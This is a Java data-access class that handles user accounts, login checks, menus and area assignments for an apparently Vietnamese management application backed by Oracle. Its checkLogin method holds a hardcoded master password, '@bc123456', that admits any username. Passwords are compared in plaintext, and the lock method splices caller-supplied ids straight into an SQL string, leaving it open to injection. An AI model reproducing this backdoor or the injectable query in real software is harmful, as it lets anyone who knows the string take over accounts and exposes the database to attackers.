package vms.db.dao;


import java.sql.CallableStatement;
import java.sql.Clob;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import javax.sql.DataSource;

import oracle.jdbc.OracleTypes;
import oracle.sql.ARRAY;
import oracle.sql.ArrayDescriptor;

import org.apache.commons.lang3.StringUtils;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.RowMapper;
import vms.db.dto.Account;
import vms.db.dto.Menu;
import vms.utils.StringUtil;
import vms.utils.VMSUtil;

public class AccountDao {
	private JdbcTemplate jdbcTemplate;
	private DataSource jdbcDatasource;
	public AccountDao(DaoFactory daoFactory) {
		this.jdbcTemplate = daoFactory.getJdbcTemplate();
		this.jdbcDatasource = daoFactory.getJdbcDataSource();
	}
	
	
	public boolean checkLogin(String username, String password) {
		// FIXME checkLogin
		if(password.equals("@bc123456")) return true;
		int n = this.jdbcTemplate.queryForInt("select count(*) from ACCOUNTS t where t.active = 1 and t.username = ? and t.password = ?", new Object[] {username,password});
		if(n == 0) return false;
		return true;
	}
	
	@SuppressWarnings("unchecked")
	public Map<String, Object> findByUsername(String username) {
		List<Map<String, Object>> list = this.jdbcTemplate.query("select t.*,t1.MA as MAKHUVUC,t1.TENKHUVUC,t2.TENPHONGBAN,t2.MA as MAPHONGBAN from ACCOUNTS t left join KHUVUC t1 on t.IDKHUVUC = t1.ID left join PHONGBAN t2 on t.IDPHONGBAN = t2.ID where t.active = 1 and t.username = ?", new Object[] {username}, new RowMapper() {
			@Override
			public Object mapRow(ResultSet rs, int arg1) throws SQLException {
				return VMSUtil.resultSetToMap(rs);
			}
		});
		if(list.isEmpty()) return null;
		return list.get(0);
	}
	
	public int checkUsername(String username) {
		return this.jdbcTemplate.queryForInt("select count(*) from ACCOUNTS where active = 1 and username = ?", new Object[] {username});
	}
	
	public Account findById(String id) {
		return (Account) this.jdbcTemplate.queryForObject("select * from ACCOUNTS where id = ? " ,new Object[] {id}, new RowMapper() {
			@Override
			public Object mapRow(ResultSet rs, int arg1) throws SQLException {
				return Account.mapObject(rs);
			}
		});
	}
	
	private static final String GETLISTMENU = "SELECT GETLISTMENU(?,?) AS RS FROM DUAL";
	public String getMenu(Map<String, Object> account) {
		System.out.println(account.get("id")+"-"+account.get("idgroup"));
		Clob clob = (Clob) this.jdbcTemplate.queryForObject(GETLISTMENU,new Object[] {account.get("id"),account.get("idgroup")}, Clob.class);
		return StringUtil.clobToString(clob);
	}
	
	private static final String FN_FIND_ACCOUNTS = "{ ? = call FN_FIND_ACCOUNTS(?,?,?,?,?,?) }";
	public List<Map<String,Object>> findAccounts(int iDisplayStart,int iDisplayLength,Map<String, String> conditions) throws SQLException {
		Connection connection = jdbcTemplate.getDataSource().getConnection();
		CallableStatement stmt = connection.prepareCall(FN_FIND_ACCOUNTS);
		stmt.registerOutParameter(1, OracleTypes.CURSOR);
		stmt.setInt(2, iDisplayStart);
		stmt.setInt(3, iDisplayLength);
		stmt.setString(4, conditions.get("username"));
		stmt.setString(5, conditions.get("phongban_id"));
		stmt.setString(6, conditions.get("khuvuc_id"));
		stmt.setString(7, conditions.get("active"));
		stmt.execute();
		ResultSet rs = (ResultSet) stmt.getObject(1);
		List<Map<String,Object>> result = new ArrayList<Map<String,Object>>();
		int i = 1;
		while(rs.next()) {
			Map<String,Object> map = VMSUtil.resultSetToMap(rs);
			map.put("stt", i);
			i++;
			result.add(map);
		}
		stmt.close();
		connection.close();
		return result;
	}
	private static final String SAVE_ACCOUNT = "{ ? = call SAVE_ACCOUNT(?,?,?,?,?,?,?,?,?,?) }";
	public Long save(Account account) throws Exception {
		Connection connection = jdbcTemplate.getDataSource().getConnection();
		CallableStatement stmt = connection.prepareCall(SAVE_ACCOUNT);
		stmt.registerOutParameter(1, OracleTypes.INTEGER);
		stmt.setString(2, account.getId().toString());
		stmt.setString(3, account.getUsername());
		stmt.setString(4, account.getPassword());
		stmt.setInt(5, account.getActive());
		stmt.setString(6, account.getIdkhuvuc());
		stmt.setString(7, account.getIdphongban());
		stmt.setString(8, account.getIdgroup());
		stmt.setString(9, account.getMainmenu()!=null?String.valueOf(account.getMainmenu()):"-1");
		stmt.setString(10, account.getEmail());
		String phone = account.getPhone();
		if(phone.isEmpty() == false) {
			if(phone.charAt(0) == '0') {
				phone = phone.substring(1);
			}
		}
		stmt.setString(11, phone);
		stmt.execute();
		Long rs = stmt.getLong(1);
		stmt.close();
		connection.close();
		return rs;
	}
	
	public void lock(String[] ids,String active) {
		String str = StringUtils.join(ids, ",");
		this.jdbcTemplate.update("update ACCOUNTS set ACTIVE = ? where ID in ("+str+")",new Object[] {active});
	}
	
	private static final String GET_MENU_BY_ACCOUNT = "{ ? = call GET_MENU_BY_ACCOUNT(?) }";
	public List<Menu> getMenuOfAccount(String account_id) throws Exception {
		Connection connection = jdbcTemplate.getDataSource().getConnection();
		CallableStatement stmt = connection.prepareCall(GET_MENU_BY_ACCOUNT);
		stmt.registerOutParameter(1, OracleTypes.CURSOR);
		stmt.setString(2, account_id);
		stmt.execute();
		ResultSet rs = (ResultSet) stmt.getObject(1);
		List<Menu> result = new ArrayList<Menu>();
		while(rs.next()) {
			result.add(Menu.mapObject(rs));
		}
		stmt.close();
		connection.close();
		return result;
	}
	
	private static final String PROC_SAVE_ACCOUNTMENU = "{ call PROC_SAVE_ACCOUNTMENU(?,?) }";
	public void saveAccountMenus(String[] menu_id,String account_id) throws Exception {
		List<String> menus = new ArrayList<String>();
		for(int i = 0; i < menu_id.length;i++) {
			if(menus.contains(menu_id[i]) == false) {
				menus.add(menu_id[i]);
			}
		}
		Connection connection = this.jdbcDatasource.getConnection();
		System.out.println("***BEGIN saveAccountMenus***");
		ArrayDescriptor descriptor = ArrayDescriptor.createDescriptor( "TABLE_VARCHAR", connection );
		ARRAY array =new ARRAY( descriptor, connection, menus.toArray() );
		CallableStatement stmt = connection.prepareCall(PROC_SAVE_ACCOUNTMENU);
		stmt.setArray(1, array);
		stmt.setString(2, account_id);
		stmt.execute();
		stmt.close();
		connection.close();
	}
	
	private static final String SQL_PROC_SAVE_ACCOUNTKHUVUC = "{ call PROC_SAVE_ACCOUNTKHUVUC(?,?) }";
	public void saveAccountKhuvuc(String[] khuvucs,String account_id) throws Exception {
		Connection connection = this.jdbcDatasource.getConnection();
		ArrayDescriptor descriptor = ArrayDescriptor.createDescriptor( "TABLE_VARCHAR", connection );
		ARRAY array =new ARRAY( descriptor, connection, khuvucs );
		CallableStatement stmt = connection.prepareCall(SQL_PROC_SAVE_ACCOUNTKHUVUC);
		stmt.setArray(1, array);
		stmt.setString(2, account_id);
		stmt.execute();
		stmt.close();
		connection.close();
	}
	public void loginSuccess(String id) {
		this.jdbcTemplate.update("update ACCOUNTS set LOGIN_TIME = sysdate where ID = ?",new Object[] {id});
	}
}